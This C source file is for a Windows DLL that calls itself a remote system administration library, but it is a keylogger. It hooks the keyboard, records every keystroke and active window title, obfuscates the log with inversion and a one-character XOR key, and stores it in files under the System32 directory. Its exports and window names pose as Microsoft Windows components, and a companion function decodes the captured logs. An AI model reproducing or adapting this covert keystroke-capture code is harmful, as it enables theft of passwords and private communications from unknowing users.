
// Library for Remote Controlled System Administration of
// Windows based computers. Program written by Arjun Menon

#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

int WINAPI DllMain(HANDLE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved);
__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
__declspec(dllexport) void AutomaticUpdate
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
/* System Monitoring */
void WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK MonWP (HWND hwnd, UINT message,
WPARAM wParam,LPARAM lParam);
void StartSensing();
HANDLE TargetFile();
char * BaseDirectory();
inline void WriteInformation(char *str);
void WriteToFile(char *str);
void InvertArray(char *X, 
const unsigned long int N);
void XorArray(char *str, 
const unsigned long int n, const char *key);
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void CALLBACK WindowTimer (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void CALLBACK TimeStamp (HWND hwnd, 
UINT message, UINT iTimerID, DWORD dwTime);
void TimeAndDate(char *str, char format);
void DescribeKey(WPARAM wParam, char *keyw);
/* Remote Access Control */
void WINAPI StartUpdate(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
/* Common Application Services */
HWND MakeSillyWindow(HINSTANCE hInstance, 
WNDPROC WndProc, LPCTSTR WndName);
/* Information File Reader */
int WINAPI InfoFileReader(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void RunProcess(char *ProcessName);
char * Unleash(char *buff, unsigned long int len, 
			unsigned long int *newlen);

/********************************.
| Global Variables and Constants |
`********************************/

#define STR_SZ1 64
#define STR_SZ2 512

const char AppName[] = 
"Microsoft® Windows® Operating System";
const char AppName2[] = 
"Microsoft® Windows® Automatic Update";
char Password[] = "a";

HANDLE hDLL = NULL;
HHOOK KeyHook = NULL;

/***************************.
| Exported DLL Entry Points |
`***************************/

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

__declspec(dllexport) void AutomaticUpdate
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartUpdate((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

__declspec(dllexport) void InfoFileRead
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	InfoFileReader((HINSTANCE)hDLL, NULL, lpszCmdLine, SW_NORMAL);
}

/***************************.
| System Monitoring Program |
`***************************/

void WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND hWnd = MakeSillyWindow
		 (hInstance,MonWP,AppName);
	 ShowWindow(hWnd, nCmdShow);
	 
	 MSG msg; /* the message catcher... */
     while (GetMessage (&msg, NULL, 0, 0))
	 {
          TranslateMessage (&msg);
          DispatchMessage (&msg);
     }
}

LRESULT CALLBACK MonWP (HWND hWnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		SetTimer(hWnd, 1, 100, WindowTimer);
		SetTimer(hWnd, 2, 2000, TimeStamp);
		StartSensing();
		break;
	case WM_CLOSE:
		KillTimer (hWnd, 1);
		KillTimer (hWnd, 2);
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hWnd, message, wParam, lParam) ;
}

void StartSensing()
{
	KeyHook = SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

FILE *GetCounterFile()
{
	static FILE *CounterFileHandle = NULL;
//uicore32.sys
	if(!CounterFileHandle)
	{
		auto char temp[STR_SZ1];
		sprintf(temp,"%sappmgmt.sys",BaseDirectory());
		HANDLE hFile = CreateFile(temp, GENERIC_WRITE,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(hFile);
		CounterFileHandle = fopen(temp,"r+b");
		auto unsigned long int count = 1;
		fwrite(&count, sizeof(unsigned long int), 
			1, CounterFileHandle);
	}

	rewind(CounterFileHandle);
	return CounterFileHandle;
}

HANDLE TargetFile()
{
	static char TargetFileName[STR_SZ1];
	static unsigned long int FileCount = 0;

	if(!FileCount) {
		// this code is executed ONLY ONCE
		FILE *fp = GetCounterFile();
		fread(&FileCount,sizeof(unsigned long int), 1, fp);
	}
	sprintf(TargetFileName,"%s%X.inv",BaseDirectory(),FileCount);

	/* grasp the file & its size*/
	HANDLE hFile = CreateFile(TargetFileName, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE) return hFile;
	DWORD FileSize = GetFileSize(hFile, NULL);
	if(FileSize == INVALID_FILE_SIZE) return hFile;

	if(FileSize > 100) {
		FileCount++;
		FILE *fp = GetCounterFile();
		fwrite(&FileCount,sizeof(unsigned long int), 1, fp);
	}
	return hFile;
}

char * BaseDirectory()
{
	static char *BaseDir = NULL;

	/* not known? */
	if(!BaseDir) {
		// this code is executed ONLY ONCE
		auto char temp[STR_SZ1];
		GetSystemDirectory(temp,STR_SZ1);
		strcat(temp,"\\srvdat\\");
		CreateDirectory(temp,NULL);

		/* copy temp to BaseDir */
		BaseDir = (char *) calloc
			(strlen(temp)+1,1);
		strcpy(BaseDir,temp);
	}

	return BaseDir;
}

void WriteInformation(char *str)
{
	static BOOL write_semaphore = FALSE;

	if(!str) 
		goto exit_point;
	if(write_semaphore == TRUE) {
		/* wait for pending write to complete */
		while(write_semaphore);
	} else
		write_semaphore = TRUE;

	WriteToFile(str);

exit_point:
	write_semaphore = FALSE;
}

inline void WriteToFile(char *str)
{
	HANDLE hFile;
	DWORD  nFile;

	if((hFile = TargetFile()) ==
	INVALID_HANDLE_VALUE) return;

	InvertArray(str,strlen(str));
	XorArray(str,strlen(str),Password);
	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, str, strlen(str), &nFile, NULL);
	CloseHandle(hFile);
}

void InvertArray(char *X, const unsigned long int N)
{
	register unsigned int i = 0;
	for(;i<N;i++) X[i] = ~X[i];
}

void XorArray(char *str, const unsigned long int n, 
			  const char *key)
{
	const int keylen = strlen(key);
	register unsigned int i = 0;
	for(;i<n;i++) /* XOR encryption */
		str[i] = str[i] ^ key[i%keylen];
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		char *keyw = (char *)calloc(STR_SZ1, sizeof(char));
		DescribeKey(wParam, keyw);

		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteInformation(key);
	exit_point:
		free(keyw);
		free(key);
	}
	return CallNextHookEx(KeyHook, code, wParam, lParam);
}

void CALLBACK WindowTimer (HWND hwnd, 
                           UINT message, 
                           UINT iTimerID, 
                           DWORD dwTime)
{
	static HWND ForegroundWindow = NULL;
	static char *PreviousWindowName = NULL;
	BOOL has_changed = FALSE;

	if(GetForegroundWindow() != ForegroundWindow) {
		has_changed = TRUE;
		ForegroundWindow = GetForegroundWindow();
	}

	/* get WindowName */
	int size = GetWindowTextLength(ForegroundWindow)+1;
	char *WindowName = (char *)calloc(size,sizeof(char));
	size = GetWindowText(ForegroundWindow, WindowName, size);

	if(PreviousWindowName != NULL && WindowName != NULL) {
		if(strcmp(PreviousWindowName, WindowName))
			has_changed = TRUE;
	} else  has_changed = TRUE;

	if(has_changed)
	{
		if(PreviousWindowName)
			free(PreviousWindowName);
		if(WindowName) {
			if(strlen(WindowName)) {
				char *str = (char *)calloc
				((size+STR_SZ1)+STR_SZ2,sizeof(char));
				sprintf(str,"\n\r%s\n",WindowName);
				WriteInformation(str);
				free(str);
				TimeStamp(NULL,0,0,0);
			}
		}
	}
	PreviousWindowName = WindowName;
}

void CALLBACK TimeStamp(HWND hwnd, 
                        UINT message, 
                        UINT iTimerID, 
                        DWORD dwTime)
{
	return;

	char *str = (char *)calloc(STR_SZ2+20,1),
	*TimeDate = (char *)calloc(STR_SZ2,1);
	TimeAndDate(TimeDate, 0);
	sprintf(str,"\n\r#TimeStamp: %s\n",TimeDate);
	WriteInformation(str);
	free(TimeDate);
	free(str);
}

void TimeAndDate(char *str, char format)
{
	static const char * const Week[7] = 
	{ "Sunday", "Monday", "Tuesday", 
	  "Wednesday", "Thursday", 
	  "Friday", "Saturday" };
	static const char * const Month[12] = 
	{ "January", "February", "March",
	  "April", "May", "June", "July",
	  "August", "September", "October",
	  "November", "December" };

	TIME_ZONE_INFORMATION here;
	SYSTEMTIME utc, local;

	GetTimeZoneInformation(&here);
	GetLocalTime(&local);
	GetSystemTime(&utc);

	char TimeZone[64];
	register int i=0;
	for(; here.StandardName[i] != 0; i++)
		TimeZone[i] = (char) here.StandardName[i];
	TimeZone[i] = '\0';

	sprintf(str,
	"%u:%u:%u %s %u %s %u %s ( %u:%u:%u %s %u %s %u GMT )",
	local.wHour,
	local.wMinute,
	local.wSecond,
	Week[local.wDayOfWeek],
	local.wDay,
	Month[local.wMonth-1],
	local.wYear,
	TimeZone,
	utc.wHour,
	utc.wMinute,
	utc.wSecond,
	Week[utc.wDayOfWeek],
	utc.wDay,
	Month[utc.wMonth-1],
	utc.wYear);
}

void DescribeKey(WPARAM wParam, char *keyw)
{
	char vkc = 0; /* virtual key code */

	vkc = /* maintain alphabet case */
		((GetKeyState(VK_SHIFT) < 0)&&(
		!(GetKeyState(VK_CAPITAL) < 0)))
		? toupper((char)(wParam))
		: tolower((char)(wParam));

	/* numeric pad keys 0 to 10 */
	if((wParam >= VK_NUMPAD0)&&
	   (wParam <= VK_NUMPAD9))
	{
		sprintf(keyw,"[NumPad:%u]",(wParam-0x60));
	}

	/* keys from 0 to 9 , A to Z and space */
	else if(((wParam >= 0x30) 
	       &&(wParam <= 0x5A)) 
	       ||(wParam == 0x20))
	{
		keyw[0] = vkc;
		keyw[1] = 0;
	}

	else switch(wParam)
	{
	case VK_CANCEL:
		strcpy(keyw,"[CTRL-BRK]");
		break;
	case VK_BACK:
		strcpy(keyw,"[BACK]");
		break;
	case VK_TAB:
		strcpy(keyw,"[TAB]");
		break;
	case VK_CLEAR:
		strcpy(keyw,"[CLEAR]");
		break;
	case VK_RETURN:
		strcpy(keyw,"[ENTER]\r\n");
		break;
	case VK_SHIFT:
		strcpy(keyw,"[SHIFT]");
		break;
	case VK_CONTROL:
		strcpy(keyw,"[CTRL]");
		break;
	case VK_MENU:
		strcpy(keyw,"[ALT]");
		break;
	case VK_PAUSE:
		strcpy(keyw,"[PAUSE]");
		break;
	case VK_CAPITAL:
		strcpy(keyw,"[CapsLock]");
		break;
	case VK_ESCAPE:
		strcpy(keyw,"[ESC]");
		break;
	case VK_PRIOR:
		strcpy(keyw,"[PageUp]");
		break;
	case VK_NEXT:
		strcpy(keyw,"[PageDown]");
		break;
	case VK_END:
		strcpy(keyw,"[END]");
		break;
	case VK_HOME:
		strcpy(keyw,"[HOME]");
		break;
	case VK_LEFT:
		strcpy(keyw,"[LEFT]");
		break;
	case VK_UP:
		strcpy(keyw,"[UP]");
		break;
	case VK_RIGHT:
		strcpy(keyw,"[RIGHT]");
		break;
	case VK_DOWN:
		strcpy(keyw,"[DOWN]");
		break;
	case VK_SELECT:
		strcpy(keyw,"[SELECT]");
		break;
	case VK_EXECUTE:
		strcpy(keyw,"[EXECUTE]");
		break;
	case VK_SNAPSHOT:
		strcpy(keyw,"[PrintScreen]");
		break;
	case VK_INSERT:
		strcpy(keyw,"[INSERT]");
		break;
	case VK_DELETE:
		strcpy(keyw,"[DELETE]");
		break;
	case VK_HELP:
		strcpy(keyw,"[HELP]");
		break;
	case VK_LWIN:
		strcpy(keyw,"[LeftWindowsKey]");
		break;
	case VK_RWIN:
		strcpy(keyw,"[RightWindowsKey]");
		break;
	case VK_APPS:
		strcpy(keyw,"[ApplicationKey]");
		break;
	case VK_MULTIPLY:
		strcpy(keyw,"[MULTIPLY]");
		break;
	case VK_ADD:
		strcpy(keyw,"[ADD]");
		break;
	case VK_SEPARATOR:
		strcpy(keyw,"[SEPERATOR]");
		break;
	case VK_SUBTRACT:
		strcpy(keyw,"[SUBTRACT]");
		break;
	case VK_DECIMAL:
		strcpy(keyw,"[DECIMAL]");
		break;
	case VK_DIVIDE:
		strcpy(keyw,"[DIVIDE]");
		break;
	case VK_F1:
		strcpy(keyw,"[F1]");
		break;
	case VK_F2:
		strcpy(keyw,"[F2]");
		break;
	case VK_F3:
		strcpy(keyw,"[F3]");
		break;
	case VK_F4:
		strcpy(keyw,"[F4]");
		break;
	case VK_F5:
		strcpy(keyw,"[F5]");
		break;
	case VK_F6:
		strcpy(keyw,"[F6]");
		break;
	case VK_F7:
		strcpy(keyw,"[F7]");
		break;
	case VK_F8:
		strcpy(keyw,"[F8]");
		break;
	case VK_F9:
		strcpy(keyw,"[F9]");
		break;
	case VK_F10:
		strcpy(keyw,"[F10]");
		break;
	case VK_F11:
		strcpy(keyw,"[F11]");
		break;
	case VK_F12:
		strcpy(keyw,"[F12]");
		break;
	case VK_F13:
		strcpy(keyw,"[F13]");
		break;
	case VK_F14:
		strcpy(keyw,"[F14]");
		break;
	case VK_F15:
		strcpy(keyw,"[F15]");
		break;
	case VK_F16:
		strcpy(keyw,"[F16]");
		break;
	case VK_NUMLOCK:
		strcpy(keyw,"[NumLock]");
		break;
	case VK_SCROLL:
		strcpy(keyw,"[ScrollLock]");
		break;
	case VK_ATTN:
		strcpy(keyw,"[ATTN]");
		break;
	case VK_CRSEL:
		strcpy(keyw,"[CrSel]");
		break;
	case VK_EXSEL:
		strcpy(keyw,"[ExSel]");
		break;
	case VK_EREOF:
		strcpy(keyw,"[EraseEOF]");
		break;
	case VK_PLAY:
		strcpy(keyw,"[PLAY]");
		break;
	case VK_ZOOM:
		strcpy(keyw,"[ZOOM]");
		break;
	default:
		sprintf(keyw,"[(%d)%c]",wParam,wParam);
		break;
	}
}

/*******************************.
| Remote Access Control Program |
`*******************************/

void WINAPI StartUpdate(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
	// mmm
}

/*****************************.
| Common Application Services |
`*****************************/

HWND MakeSillyWindow(HINSTANCE hInstance, 
				WNDPROC WndProc, LPCTSTR WndName)
{
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = WndName ;

     if (!RegisterClass (&wndclass))
          return NULL ;

     return CreateWindow (WndName, WndName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;
}

/*************************.
| Information File Reader |
`*************************/

int WINAPI InfoFileReader(HINSTANCE hInstance, 
						  HINSTANCE hPrevInstance, 
						  LPSTR lpCmdLine, int nShowCmd)
{
	HANDLE hFile  = CreateFile(lpCmdLine, GENERIC_READ,
	0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return 0;


	const int buff_size = 4096;
	char FileName[255];
    if(!GetTempPath(255,FileName))
		strcpy(FileName,"C:\\");
    strcat(FileName,"Inverted");
	DeleteFile(FileName);
    
	char ProcessName[300];
	strcpy(ProcessName,"notepad ");
	strcat(ProcessName,FileName);
 
	unsigned long int  BytesRead, 
	BytesToWrite, BytesWritten, Pos; 
	char buff[buff_size], *wdata;

	HANDLE hWrite = CreateFile(FileName, GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hWrite == INVALID_HANDLE_VALUE) return 0;

	do 
	{ 
		if (ReadFile(hFile, buff, buff_size, &BytesRead, NULL)) 
		{ 
			Pos = SetFilePointer(hWrite, 0, NULL, FILE_END); 
			LockFile(hWrite, Pos, 0, Pos + BytesRead, 0);
			wdata = Unleash(buff, BytesRead, &BytesToWrite);
			WriteFile(hWrite, wdata, BytesToWrite, 
				&BytesWritten, NULL);
			free(wdata);
			UnlockFile(hWrite, Pos, 0, Pos + BytesRead, 0); 
		} 
	}	while (BytesRead == buff_size); 

	CloseHandle(hFile);
	CloseHandle(hWrite);

	void RunProcess(char *ProcessName);
	RunProcess(ProcessName);

	DeleteFile(FileName);

	return 0;
}

void RunProcess(char *ProcessName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    CreateProcess( NULL, ProcessName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

char * Unleash(char *buff, unsigned long int len,
			 unsigned long int *newlen)
{
	char *data = (char *)calloc((strlen(buff)+1)*2,1), *dp;
	XorArray(buff,strlen(buff),Password);
	InvertArray(buff, len);

	register unsigned long int i;
	for(*newlen=0, dp=data, i=0; i<len; i++)
	{
		if(buff[i]=='\n'&&buff[i-1]!='\r')
		{
			if(buff[i+1]=='\r') {
				i++;
				strcat(dp,"\r\n<<");
				dp+=4;
				(*newlen)+=4;
			}
			else if(buff[i+1]=='\n') {
				strcat(dp,">>");
				dp+=2;
				(*newlen)+=2;
			}
			else {
				strcat(dp,">>\r\n");
				dp+=4;
				(*newlen)+=4;
			}
		}
		else
		{
			*dp++ = buff[i];
			(*newlen)++;
		}
	}
	return data;
}
